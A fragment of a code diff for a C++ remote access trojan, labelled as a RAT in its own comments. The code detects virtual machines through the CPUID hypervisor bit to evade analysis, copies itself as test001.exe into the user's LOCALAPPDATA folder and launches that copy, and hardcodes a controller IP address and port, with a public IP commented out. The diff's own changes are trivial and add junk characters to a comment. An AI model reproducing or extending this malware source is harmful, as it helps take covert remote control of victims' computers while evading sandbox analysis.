@@ -12,7 +12,6 @@ bool vmCheck() {
     return ((info[2] >> 31) == 1); //if its 1 so the exe running on vm if not so its running on physical machine
 }
 
-
 //Creating a new same RAT in C:\\C_projects\\test001.exe
 bool moveFilePlace() {
     TCHAR szExeFileName[MAX_PATH];
@@ -60,7 +59,6 @@ bool moveFilePlace() {
 }
 
 int main() {
-
     //Checking if the file test001.exe is exist
     if (!moveFilePlace()) {
         string path = getenv("LOCALAPPDATA");
@@ -68,7 +66,7 @@ int main() {
         system(("cd " + path + "&& start test001.exe").c_str());
         return 0;
     } else {
-        //::ShowWindow(::GetConsoleWindow(), SW_SHOW);
+        //::ShowWindow(::GetConsoleWindow(), SW_SHOW);fdsafdsafdsaf
         //string ip = "141.226.121.68";
         string ip = "192.168.1.210";
         int port = 9087;
